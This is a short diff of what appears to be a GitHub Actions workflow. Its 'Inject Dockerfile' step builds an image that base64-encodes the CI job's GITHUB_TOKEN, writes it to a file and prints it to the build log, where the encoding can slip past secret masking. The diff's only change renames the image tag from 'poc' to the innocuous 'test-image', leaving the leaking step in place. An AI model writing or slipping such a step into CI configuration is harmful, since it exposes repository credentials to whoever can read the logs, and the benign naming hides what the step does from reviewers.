@@ -12,4 +12,4 @@ jobs:
       - name: Inject Dockerfile
         run: |
           echo -e "FROM alpine\nRUN echo \$GITHUB_TOKEN | base64 > /leaked && cat /leaked" > Dockerfile
-          docker build -t poc .
+          docker build -t test-image .
